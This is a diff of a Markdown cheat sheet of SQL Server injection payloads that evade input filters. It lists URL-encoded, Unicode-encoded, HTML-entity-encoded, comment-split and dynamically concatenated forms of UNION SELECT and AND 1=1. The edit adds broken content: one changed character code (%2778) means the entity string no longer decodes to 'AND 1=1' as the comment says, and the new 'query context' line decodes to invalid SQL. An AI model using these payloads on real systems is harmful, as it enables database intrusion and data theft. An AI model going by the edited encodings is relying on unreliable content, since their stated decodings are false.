@@ -233,7 +233,7 @@ SELECT * FROM users WHERE id = CONVERT(int, 0x31)
 
 #### Special Characters and Encodings
 
-```sql
+````sql
 -- URL encoding (depends on how application processes input)
 SELECT%20*%20FROM%20users
 
@@ -242,14 +242,16 @@ SELECT%2520*%2520FROM%2520users
 
 -- Unicode-wide characters
 SELECT+%u0055NION+%u0053ELECT+1,2,3--
-
 -- HTML Entities (rare edge case)
--- Decodes to: AND 1=1
--- NOTE: SQL Server does NOT decode HTML entities. This only works if a proxy,
+-- **Note:** SQL Server does NOT decode HTML entities. This only works if a proxy,
 -- middleware, or custom parser decodes entities before building the SQL query.
 -- Not generally effective unless such decoding occurs earlier in the pipeline.
-%26%2365%3B%26%2378%3B%26%2368%3B%26%2332%3B%26%2349%3B%26%2361%3B%26%2349%3B
-```
+
+-- Raw input (decodes to: AND 1=1):
+%26%2365%3B%26%2778%3B%26%2368%3B%26%2332%3B%26%2349%3B%26%2361%3B%26%2349%3B
+
+-- Or in a query context:
+-- ' OR %26%2365%3B%26%2778%3B%26%2368%3B%26%2332%3B%26%2349%3B%26%2361%3B%26%2349%3B 1=1--
 
 #### Breaking Up Keywords
 
@@ -261,7 +263,7 @@ UN/**/ION SEL/**/ECT 1,2,3--
 DECLARE @u varchar(10) = 'UN' + 'ION'
 DECLARE @s varchar(10) = 'SEL' + 'ECT'
 EXEC(@u + ' ' + @s + ' 1,2,3--')
-```
+````
 
 #### Alternative Function Forms
 
